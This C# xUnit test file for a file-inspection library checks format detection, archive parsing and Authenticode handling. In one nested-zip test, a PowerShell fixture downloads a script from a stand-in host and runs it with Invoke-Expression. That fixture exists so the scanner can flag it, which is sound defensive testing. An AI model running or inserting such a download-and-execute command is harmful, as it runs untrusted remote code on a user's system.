using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using Xunit;

namespace FileInspectorX.Tests;

public sealed partial class PortableAnalysisTests
{
    [Theory]
    [InlineData("iso")]
    [InlineData("udf")]
    [InlineData("dmg")]
    [InlineData("etl")]
    public void OffsetAndTraceFormatsUseCompleteContentAcrossAdapters(string extension)
    {
        var bytes = new byte[0x9000];
        var marker = extension switch { "iso" => "CD001", "udf" => "NSR03", "dmg" => "koly", _ => "ElfF\0\x01" };
        int offset = extension switch { "iso" or "udf" => 0x8001, "dmg" => bytes.Length - 512, _ => 0 };
        Encoding.ASCII.GetBytes(marker).CopyTo(bytes, offset);
        var options = Options(); options.Settings = options.Settings! with { EtlValidation = Settings.EtlValidationMode.MagicOnly };
        foreach (var result in InspectShapes(bytes, "upload." + extension, options))
        {
            Assert.Equal(extension, result.Detection!.Extension);
            Assert.Equal(Hash(bytes), result.Detection.Sha256Hex);
            Assert.Equal(InspectionOutcome.Complete, result.Outcome);
        }
    }

    [Fact]
    public void NativeTraceValidationIsExplicitlyUnavailableWithoutAPath()
    {
        var options = Options(); options.Settings = options.Settings! with { EtlValidation = Settings.EtlValidationMode.NativeThenTracerpt };
        var result = FileInspector.Analyze(Encoding.ASCII.GetBytes("ElfF\0\x01"), options, "upload.etl");
        Assert.Equal("etl", result.Detection!.Extension);
        Assert.Equal(InspectionStageStatus.Unavailable, Stage(result, InspectionStage.EtlValidation).Status);
        Assert.Contains("etl-validation:path-required", result.AnalysisIssues!);
        Assert.False(result.AnalysisComplete);
    }

    [Theory]
    [InlineData("zip")]
    [InlineData("tar")]
    [InlineData("rar")]
    public void StoredExecutableChildrenUseContentAndPropagateMissingNativeTrust(string extension)
    {
        var payload = File.ReadAllBytes(typeof(FileInspector).Assembly.Location);
        var bytes = Archive(extension, "payload.dll", payload);
        var options = Options();
        options.IncludeAuthenticode = true;
        // Coverage instrumentation enlarges the assembly fixture. Both independent
        // limits must permit the full payload requested by this sampling contract.
        const int fixtureBudget = 4 * 1024 * 1024;
        Assert.InRange(payload.Length, 1, fixtureBudget);
        options.Settings = options.Settings! with {
            DeepContainerMaxEntryBytes = fixtureBudget, ArchiveMaxEntryReadBytes = fixtureBudget,
            VerifyAuthenticodeWithWinTrust = true
        };
        foreach (var result in InspectShapes(bytes, "upload." + extension, options))
        {
            Assert.Equal(extension, result.Detection!.Extension);
            Assert.Equal(1, result.InnerExecutablesSampled);
            Assert.Equal(Hash(bytes), result.Detection.Sha256Hex);
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                Assert.Contains("archive:authenticode-policy:path-required", result.AnalysisIssues!);
                Assert.Equal(InspectionStageStatus.Partial, Stage(result, InspectionStage.Container).Status);
                Assert.Equal(InspectionOutcome.Partial, result.Outcome);
            }
        }
    }

    [Fact]
    public void NestedArchiveKeepsChildSignalsAndCompletionLimits()
    {
        var child = ZipTestArchive.Create(("payload.ps1", "Invoke-WebRequest https://example.invalid/a.ps1; Invoke-Expression $value"));
        var bytes = Archive("zip", "nested.zip", child);
        foreach (var result in InspectShapes(bytes, "upload.zip", Options()))
        {
            Assert.Contains("archive:inner-script-download", result.SecurityFindings!);
            Assert.Equal(InspectionOutcome.Complete, result.Outcome);
        }
        var limited = Options(); limited.Settings = limited.Settings! with { ArchiveMaxEntryReadBytes = 16 };
        var partial = FileInspector.Analyze(bytes, limited);
        Assert.Equal(InspectionStageStatus.Partial, Stage(partial, InspectionStage.Container).Status);
        Assert.False(partial.AnalysisComplete);
    }

    private static byte[] Archive(string extension, string name, byte[] payload)
    {
        using var output = new MemoryStream();
        if (extension == "zip")
        {
            using (var zip = new ZipArchive(output, ZipArchiveMode.Create, leaveOpen: true))
            using (var entry = zip.CreateEntry(name, CompressionLevel.NoCompression).Open()) entry.Write(payload, 0, payload.Length);
        }
        else if (extension == "tar")
        {
            InspectionIntegrityTests.WriteTarHeader(output, name, size: payload.Length);
            output.Write(payload, 0, payload.Length);
            output.Write(new byte[(512 - payload.Length % 512) % 512 + 1024], 0, (512 - payload.Length % 512) % 512 + 1024);
        }
        else
        {
            output.Write(new byte[] { (byte)'R', (byte)'a', (byte)'r', (byte)'!', 0x1A, 7, 0 }, 0, 7);
            using var writer = new BinaryWriter(output, Encoding.ASCII, leaveOpen: true);
            writer.Write((ushort)0); writer.Write((byte)0x74); writer.Write((ushort)0x8000); writer.Write((ushort)(32 + name.Length));
            writer.Write((uint)payload.Length); writer.Write((uint)payload.Length); writer.Write((byte)2);
            writer.Write(0u); writer.Write(0u); writer.Write((byte)20); writer.Write((byte)0x30);
            writer.Write((ushort)name.Length); writer.Write(0u); writer.Write(Encoding.ASCII.GetBytes(name)); writer.Write(payload);
        }
        return output.ToArray();
    }
}
